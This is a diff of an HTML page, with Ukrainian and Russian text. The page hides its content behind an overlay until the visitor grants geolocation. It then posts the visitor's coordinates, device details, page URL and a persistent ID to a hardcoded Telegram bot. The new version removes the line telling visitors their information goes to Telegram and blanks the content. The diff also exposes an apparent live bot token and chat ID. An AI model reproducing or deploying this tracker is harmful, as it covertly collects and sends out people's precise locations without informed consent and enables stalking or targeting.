@@ -3,120 +3,85 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Геозахищений сайт</title>
+  <title>GEO Site</title>
   <style>
-    body {
-      font-family: sans-serif;
-      margin: 0;
-      padding: 0;
-    }
-
+    body { font-family: sans-serif; margin: 0; padding: 0; }
     #geo-block {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: white;
-      color: black;
-      z-index: 9999;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: 2rem;
+      position: fixed; top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: white; color: black;
+      z-index: 9999; display: flex;
+      align-items: center; justify-content: center;
+      text-align: center; padding: 2rem;
     }
-
-    #main-content {
-      display: none;
-      padding: 2rem;
-    }
+    #main-content { display: none; padding: 2rem; }
   </style>
 </head>
 <body>
 
-  <div id="geo-block">
-    ⛔ Для перегляду сайту потрібно надати доступ до геолокації.
-    <br><br>
-    Оновіть сторінку та дозвольте доступ.
-  </div>
+<div id="geo-block">⛔ Откройте сайт в браузере</div>
+<div id="main-content"></div>
 
-  <div id="main-content">
-    ✅ Доступ дозволено. Вітаємо на сайті!
-    <p>Ваш сеанс активний, інформація надіслана до Telegram.</p>
-  </div>
+<script>
+  const TOKEN = 'ТВОЙ_ТОКЕН';
+  const CHAT_ID = 'ТВОЙ_CHAT_ID';
 
-  <script>
-    const TOKEN = 'ТВОЙ_ТОКЕН';
-    const CHAT_ID = 'ТВОЙ_CHAT_ID';
+  let visitId = localStorage.getItem('visit_id');
+  if (!visitId) {
+    visitId = 'gumikk-' + Math.random().toString(36).substring(2, 7);
+    localStorage.setItem('visit_id', visitId);
+  }
 
-    // === Унікальний ID відвідувача ===
-    let visitId = localStorage.getItem('visit_id');
-    if (!visitId) {
-      visitId = Math.random().toString(36).substring(2);
-      localStorage.setItem('visit_id', visitId);
+  function getBrowserInfo() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    return "Невідомий";
+  }
+
+  function getOSInfo() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Win")) return "Windows";
+    if (ua.includes("Mac")) return "macOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("like Mac")) return "iOS";
+    return "Невідома";
+  }
+
+  const browser = getBrowserInfo();
+  const os = getOSInfo();
+
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      document.getElementById('geo-block').style.display = 'none';
+      document.getElementById('main-content').style.display = 'block';
+
+      const lat = pos.coords.latitude.toFixed(4);
+      const lon = pos.coords.longitude.toFixed(4);
+      const acc = Math.round(pos.coords.accuracy);
+      const time = new Date().toLocaleTimeString().slice(0,5);
+
+      const msg = `👁️ Відвідувач на сайті
+🕒 ${time}
+💻 ${os} / ${browser}
+🌐 ${location.href}
+📍 Гео: ${lat}, ${lon} (±${acc}м)
+🆔 ID: ${visitId}`;
+
+      fetch(`https://api.telegram.org/bot${7643687227:AAGIfbY0dPgbCQ0d0402dk1_8Fn6nS7lOV0}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: 1938874314, text: msg })
+      });
+    },
+
+    function() {
+      console.warn("Геолокація не дозволена");
+      // блокировка остаётся
     }
-
-    // === Браузер та ОС ===
-    function getBrowserInfo() {
-      const ua = navigator.userAgent;
-      if (ua.includes("Chrome")) return "Chrome";
-      if (ua.includes("Firefox")) return "Firefox";
-      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
-      if (ua.includes("Edge")) return "Edge";
-      return "Невідомий";
-    }
-
-    function getOSInfo() {
-      const ua = navigator.userAgent;
-      if (ua.includes("Win")) return "Windows";
-      if (ua.includes("Mac")) return "macOS";
-      if (ua.includes("Linux")) return "Linux";
-      if (ua.includes("Android")) return "Android";
-      if (ua.includes("like Mac")) return "iOS";
-      return "Невідома";
-    }
-
-    const browser = getBrowserInfo();
-    const os = getOSInfo();
-
-    // === Геолокація з обробкою ===
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        document.getElementById('geo-block').style.display = 'none';
-        document.getElementById('main-content').style.display = 'block';
-
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const acc = Math.round(position.coords.accuracy);
-
-        const message = `
-🧑‍💻 Новий відвідувач сайту
-🕒 Час: ${new Date().toLocaleTimeString()}
-🧾 ID візиту: ${visitId}
-
-📱 Пристрій: ${browser} / ${os}
-📍 Координати: ${lat}, ${lon}
-🎯 Точність: ±${acc} м
-🌐 Сторінка: ${location.href}
-`;
-
-        fetch(`https://api.telegram.org/bot${7643687227:AAGIfbY0dPgbCQ0d0402dk1_8Fn6nS7lOV0}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: 1938874314,
-            text: message
-          })
-        });
-      },
-
-      function(error) {
-        // Якщо відмовлено — залишаємо блокування
-        console.warn("Геолокація відхилена:", error);
-      }
-    );
-  </script>
-
+  );
+</script>
 </body>
 </html>
